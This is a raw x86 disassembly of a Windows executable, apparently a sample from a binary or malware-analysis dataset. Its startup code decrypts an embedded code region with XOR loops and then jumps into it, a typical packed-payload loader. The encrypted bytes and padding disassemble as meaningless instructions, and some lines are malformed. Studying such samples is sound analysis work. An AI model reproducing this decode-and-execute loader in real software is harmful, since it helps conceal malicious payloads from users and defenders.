sub_401120
test eax 0xf73efca2
adc cl [ ebx - 0x1f47b1 ]
xchg ebx eax
dec ebx
mov edx 0xf322dfc9
nop
loope rwxdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x8c1035e ] ch
push ds
dec ebx
pop ebx
push eax
push edi
leave
inc ebx
pushad
clc
ffree st0
xchg edi eax
push ss
jg rwxdata
mov eax [ 0x6aef3c6d ]
loop rwxdata
jmp ebp
cld
sub al 0x2f
dec eax
add [ ebx - 0x7fa6df6f ] 0x46
sar [ eax - 0x2 ] cl
or edx ebx
jbe rwxdata
jns rwxdata
add [ eax ] al
cmp al 0xa1
insd
cmp al 0xef
push 0xffffffe2
jpo rwxdata
lahf
lahf
pop esi
je rwxdata
sub eax 0xadd07459
and eax 0x46e340c3
mov dl 0xa1
jpe rwxdata
das
salc
push eax
fdivr [ edi - 0x32 ]
mov eax [ gs : ecx - 0x55d63eb5 ]
jecxz rwxdata
fistp [ ecx - 0x63 ]
imul edx [ eax + 0x75e3477f ] 0x7b4c042b
int 0x9d
and [ ecx + 0x4b ] al
pop ebx
push eax
jne rwxdata
outsb
dec ebx
outsb
fdivr [ bx + 0x47 ]
sahf
dec edx
inc eax
or ebp ecx
push ds
0x42c559ef 0x505b
adc [ ebp - 0x77 ] al
dec ebx
xchg ecx eax
xor al 0xfc
rcr bh 0x59
popfd
inc edx
jecxz rwxdata
fild [ esi + 0x4b ]
push edi
fdivr [ edi + 0x47 ]
xchg esp eax
cmc
pop esp
jpe rwxdata
adc al 0xc0
and eax 0x2dda309f
pop ecx
je rwxdata
aam 0xfa
leave
lodsd [ esi ]
sub_4020d6
push eax
push ecx
in eax dx
fcom [ edi + 0xd ]
cmpsd [ esi ] [ edi ]
jl rwxdata
push ds
or eax 0xb8350fff
push ecx
or eax 0x6aa2e0dc
retn 0x417a
inc ecx
sbb [ esi ] 0xa4
push ds
cmpsd [ esi ] [ edi ]
adc eax 0x51b80fa8
cmp esp ebx
xor eax 0x7acb6e12
inc ecx
xor [ esi ] bl
lea eax [ ecx + 0x51b4379c ]
add eax 0xbea400dc
stc
jbe rwxdata
inc ecx
mov [ esi ] bl
pushad
nop
inc ecx
adc dl [ eax + 0x51 ]
adc eax 0x544e0cdc
into
xchg edx eax
inc ecx
js rwxdata
mov edx [ ebp + 0xa ]
push eax
push ecx
sbb eax 0x397397dc
push ds
movsb [ edi ] [ esi ]
mov al [ 0xffffffffc605ea1e ]
test [ ecx + edx * 2 + 0x180fdc3d ] esi
pop eax
shl [ esi + 0x41 ] cl
movsb [ edi ] [ esi ]
push ds
xor bl [ ebx + 0x51b4cd0a ]
test eax 0x943cc7dc
outsd
jpe rwxdata
loopne rwxdata
cmp ah [ ebx ]
inc ecx
xor eax 0xdce55150
push ds
xor al 0x1e
xlat
xchg [ ebx - 0x52ae4b39 ] edi
fcom st0
inc ebp
sti
0x4192
mov ecx 0x7cbee1a
xor bh [ eax + 0x7fd82451 ]
inc edi
jecxz rwxdata
sub eax 0xb8047ab8
push ecx
jge rwxdata
xchg edx eax
int3
inc esp
push ds
dec ecx
fdiv st5
and eax 0xdcc151b8
jno rwxdata
push ss
into
cld
inc ecx
outsd
fisttp [ edx ]
jpe rwxdata
push eax
push ecx
in eax 0xdc
jb rwxdata
xchg edi eax
jae rwxdata
jmp 0xffffffffe0819b2b
push eax
fdivr [ edi - 0x2f ]
popfd
sub [ edx + 0x41 ] bh
in al 0x1e
js rwxdata
mov eax 0x72dc7d51
dec esp
jge rwxdata
imul esp [ edx - 0x2aa5d633 ] 0x51
mov bh 0x1c
jno rwxdata
push ebx
pop esi
je rwxdata

mov dh [ ebp - 0x29dfae48 ]
lodsb [ esi ]
das
jmp rwxdata
sar [ esi ] 0x77
and al 0xd3
pop ecx
pop ebp
jae rwxdata
push 0x1ee44460
pop edi
and edi [ ecx + 0x40 ]
push esp
add [ ebx - 0x8edf838 ] al
and eax 0x4bdd3f8e
das
inc ecx
pop edx
mov dh 0x1c
jno rwxdata
pop esi
mov esp 0x7186746e
in eax dx
inc eax
mov al 0x8b
in eax dx
inc [ edi + 0x3f ]
dec esi
sahf
push 0x37
cmp [ esi + 0x2c ] dh
das
idiv [ edi - 0x13 ]
jecxz rwxdata
sub ebx [ esi - 0x2 ]
sbb al 0xbb
div [ eax ]
mov esi 0x376a9e29
cwde
jbe rwxdata
jge rwxdata
dec eax
mov al 0x30
ja rwxdata
cmp al 0x29
push ds
cld
push 0xffffffdf
cmp edx ecx
cld
pop es
int 0x7f
inc edi
or edi [ edx ]
mov [ ebx - 0x3f ] ecx
cdq
retn
mov ebp 0xcbd6ce6e
cmp esp [ edx + 0x3c ]
mov ecx 0xdc505ba3
jg rwxdata
fdivrp st4
or edi ebp
iretd
mov [ 0x60686d2d ] al
inc esp
rcr [ esi ] 0x79
pop edi
in al 0x1e
fstp st3
stosb [ edi ]
fcom [ esi + 0x1b3af6de ]
call 0xffffffffa3019eb4
sub eax 0x4460686d
jpe rwxdata
mov al 0xb3
adc eax 0x2ef096b6
retn
inc esi
bound ecx [ eax + 0x1ec14aba ]
jns rwxdata
loopne rwxdata
jge rwxdata
outsb
into
salc

cmp al 0xa3
push ds
adc al 0xaa
and bl [ ecx + 0x74 ]
push eax
nop
popad
movsd [ edi ] [ esi ]
out dx eax
jg rwxdata
enter 0xc32f 0x9d
push esi
and edi [ edi + 0x2c ]
int 0xd9
dec esi
mov al 0x1c
xor edi [ esi + 0x4b ]
rcr [ esi ] 0xf3
out 0x7c al
outsb
dec ebx
pop ebx
das
popad
dec ebx
mov al 0x7e
sub edi [ eax + 0x99ebe3c ]
out dx al
sub bl [ ecx + 0x74 ]
pop edx
lodsb [ esi ]
imul edi edx 0xb6766f7a
xchg esp eax
les edi [ esi + 0x209183e3 ]
pop ecx
sub [ ebx - 0x48 ] ebx
inc edx
mov al 0x1c
iretd
sub_40248c
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x68 ] dh
add [ eax ] al
aas
outsd
inc eax
add [ esi + 0x6f ] dl
inc eax
add [ esi + 0x6f ] dl
inc eax
add [ esi ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7c004025 ] dh
les eax [ eax ]
jl rwxdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne rwxdata
inc eax
add [ esp + eax * 8 + 0x40 ] bh
add [ esp + eax * 8 + 0x40 ] bh
add [ esp + eax * 8 + 0x40 ] bh
add [ esp + eax * 8 + 0x40 ] bh
add [ esp + eax * 8 + 0x40 ] bh
add [ esp + eax * 8 + 0x40 ] bh
add [ esp + eax * 8 + 0x40 ] bh
add [ edi + 0x7f ] bh
jg rwxdata
add [ eax ] al
jae rwxdata
add [ eax + eax + 0x840084 ] al
jg rwxdata
test [ eax ] al
add [ eax + eax + 0x840084 ] al
jg rwxdata
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
add [ eax ] 0x810081
add [ eax ] 0x810081
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
add [ eax ] eax
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
add [ eax ] 0x82
add [ edx - 0x7dff7e00 ] al
add [ edx + 0x2000200 ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ edx ] al
add [ eax ] dl
add [ eax ] dl
add [ eax ] dl
add [ eax ] dl
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dl
sub [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
push ebp
inc eax
add [ ebp + edx * 2 + 0x55900040 ] dl
inc eax
add [ ebp + edx * 2 + 0x55880040 ] cl
inc eax
add [ ebp + edx * 2 + 0x55800040 ] al
inc eax
add [ eax + 0x55 ] bh
inc eax
add [ eax + 0x55 ] dh
inc eax
add [ eax + 0x55 ] ch
inc eax
add [ ebp + edx * 2 + 0x40 ] bl
add [ eax + 0x55 ] dl
inc eax
add [ eax + 0x55 ] cl
inc eax
add [ edx * 2 + 0x55380040 ] bh
inc eax
add [ edx * 2 + 0x55300040 ] dh
inc eax
add [ edx * 2 + 0x55280040 ] ch
inc eax
add [ edx * 2 + 0x55200040 ] ah
inc eax
add [ edx * 2 + 0x55180040 ] bl
inc eax
add [ edx * 2 + 0x55100040 ] dl
inc eax
add [ edx * 2 + 0x55040040 ] cl
inc eax
add al bh
push esp
inc eax
add al dh
push esp
inc eax
add al ch
push esp
inc eax
add [ eax ] ch
push ebp
inc eax
add al ah
push esp
inc eax
add al bl
push esp
inc eax
add al dl
push esp
inc eax
add ah al
push esp
inc eax
add [ esp + edx * 2 + 0x54b00040 ] bh
inc eax
add [ esp + edx * 2 + 0x54a00040 ] ah
inc eax
add [ esp + edx * 2 + 0x54940040 ] bl
inc eax
add [ eax + 0x78004054 ] al
push esp
inc eax
add [ eax ] cl
push esi
inc eax
add al bh
push ebp
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] ah

add [ eax + eax + 0x840084 ] al
test [ eax ] al
mov eax 0x4025
add [ eax ] al
add dl bh
and eax 0x25fa0040
inc eax
add [ eax ] al
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ch
add [ eax ] ch
add [ eax ] ch
add [ eax ] ch
add [ eax ] ch
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] ah
add [ eax ] cl
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
test [ eax ] al
test [ eax ] al
test [ eax ] al
test [ eax ] al
test [ eax ] al
test [ eax ] al
test [ eax ] al
test [ eax ] al
sub_405077
push [ 0xb000000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc [ ebx ]
add [ eax ] al
add [ eax ] 0x0
add [ ecx + 0x18ffffff ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ edi ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_405a40
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
push edi
push ebx
call sub_405db0
mov esi [ esp + 0x18 ]
mov ecx ebx
mov ebp eax
mov eax ecx
mov edi ebp
add esp 0x4
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebx
mov esi ebp
shr ecx 0x4
add ebp 0x10
lea eax [ ecx - 0x1 ]
test eax eax
jbe rwxdata
lea esi [ ebx - 0x10 ]
test esi esi
jbe rwxdata
mov edx ebp
mov edi eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esp + 0x18 ]
mov eax ebp
sub eax ecx
mov al [ ecx + esi ]
xor [ edx + ecx ] al
inc ecx
cmp ecx 0x10
jl rwxdata
add edx 0x10
dec edi
jne rwxdata
mov dl [ eax + ecx ]
xor dl 0xae
mov [ ecx ] dl
inc ecx
dec esi
jne rwxdata
xor ecx ecx
sub_405ac0
push edi
mov edi [ esp + 0xc ]
lea eax [ edi + edi ]
push eax
push 0x0
call [ GlobalAlloc@IAT ]
xor edx edx
test edi edi
jle rwxdata
pop edi
retn
push ebx
push esi
mov esi [ esp + 0x10 ]
lea ecx [ eax + 0x1 ]
mov al [ edx + esi ]
mov bl 0x7
shr al 0x4
sub al 0x67
mov [ ecx - 0x1 ] al
mov al [ edx + esi ]
and al 0xf
add ecx 0x2
sub al 0x5a
mov [ ecx - 0x2 ] al
mov al dl
imul bl
mov bl [ ecx - 0x3 ]
add al 0x6c
xor bl al
mov al dl
shl al 0x2
mov [ ecx - 0x3 ] bl
mov bl [ ecx - 0x2 ]
add al 0x7a
xor bl al
mov [ ecx - 0x2 ] bl
mov al [ ecx - 0x3 ]
add al 0x7
shl al 0x4
mov [ edx + esi ] al
mov al [ ecx - 0x2 ]
sub al 0x6
and al 0xf
mov [ ecx - 0x2 ] al
mov bl [ edx + esi ]
xor bl al
mov [ edx + esi ] bl
inc edx
cmp edx edi
jl rwxdata
pop esi
pop ebx
sub_405b40
push ebp
mov ebp esp
push ecx
push 0x1340
push sub_401120
push sub_401120
mov [ ebp - 0x4 ] sub_401120
call sub_405a40
push 0x1340
push sub_401120
call sub_405ac0
add esp 0x14
mov eax [ ebp - 0x4 ]
call eax
xor eax eax
mov esp ebp
pop ebp
retn 0x10
sub_405bc0
mov eax [ ecx + 0x4 ]
test eax eax
jbe rwxdata
mov eax [ ecx + 0x4 ]
neg eax
sbb eax eax
not eax
and eax ecx
retn
cmp eax 0xffffffff
jae rwxdata
dec eax
mov [ ecx + 0x4 ] eax
sub_405d5a
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
mov eax [ esi + 0xc ]
test al 0x40
je rwxdata
test al 0x83
je rwxdata
or eax 0xffffffff
jmp rwxdata
mov eax edi
push esi
call sub_4074bb
push esi
mov edi eax
call sub_407455
push [ esi + 0x10 ]
call sub_4073a2
add esp 0xc
test eax eax
jge rwxdata
and [ esi + 0xc ] 0x0
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je rwxdata
or edi 0xffffffff
jmp rwxdata
push eax
call sub_406295
and [ esi + 0x1c ] 0x0
pop ecx
sub_405dc0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push rwxdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_405e02
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_405de0
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je rwxdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne rwxdata
jmp rwxdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_405e96
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je rwxdata
sub_405eae
push esi
push [ rwxdata ]
call sub_4076f2
mov edx [ rwxdata ]
pop ecx
mov ecx [ rwxdata ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
pop esi
jae rwxdata
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
add [ rwxdata ] 0x4
retn
push edx
call sub_4076f2
add eax 0x10
push eax
push [ rwxdata ]
call sub_40697e
add esp 0xc
test eax eax
jne rwxdata
mov ecx [ rwxdata ]
sub ecx [ rwxdata ]
mov [ rwxdata ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rwxdata ] ecx
retn
sub_405f2d
push 0x80
call sub_4068cc
test eax eax
pop ecx
mov [ rwxdata ] eax
jne rwxdata
and [ eax ] 0x0
mov eax [ rwxdata ]
mov [ rwxdata ] eax
retn
push 0x18
call sub_4063f4
mov eax [ rwxdata ]
pop ecx
sub_405f60
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe rwxdata
test edi 0x3
jne rwxdata
cmp edi eax
jb rwxdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne rwxdata
jmp [ ecx * 4 + rwxdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_405fc0 ]
jmp [ ecx * 4 + jump_table_40603c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4060a8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4060a8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_406240 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_406148 ]
neg ecx
jmp [ ecx * 4 + rwxdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406240 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4060a8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4060a8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4060a8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_406240 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406240 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406240 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406240 ]
sub_406295
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je rwxdata
pop esi
leave
retn
mov eax [ rwxdata ]
cmp eax 0x3
jne rwxdata
cmp eax 0x2
jne rwxdata
push esi
call sub_407b52
pop ecx
test eax eax
push esi
je rwxdata
push esi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_4088ad
add esp 0xc
test eax eax
je rwxdata
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
push eax
call sub_407b7d
pop ecx
pop ecx
jmp rwxdata
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_408904
add esp 0xc
jmp rwxdata
_start
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rwxdata ] edx
mov ecx eax
and ecx 0xff
mov [ rwxdata ] ecx
shl ecx 0x8
add ecx edx
mov [ rwxdata ] ecx
shr eax 0x10
mov [ rwxdata ] eax
xor esi esi
push esi
call sub_407aad
pop ecx
test eax eax
jne rwxdata
mov [ ebp - 0x4 ] esi
call sub_409332
call [ GetCommandLineA@IAT ]
mov [ rwxdata ] eax
call sub_409200
mov [ rwxdata ] eax
call sub_408fb3
call sub_408efa
call sub_406e3d
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_408ea2
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je rwxdata
push 0x1c
call sub_406419
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp rwxdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_405b40
mov [ ebp - 0x60 ] eax
push eax
call sub_406e6a
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_408d1e
pop ecx
pop ecx
retn
sub_406440
mov ecx [ esp + 0x4 ]
test ecx 0x3
je rwxdata
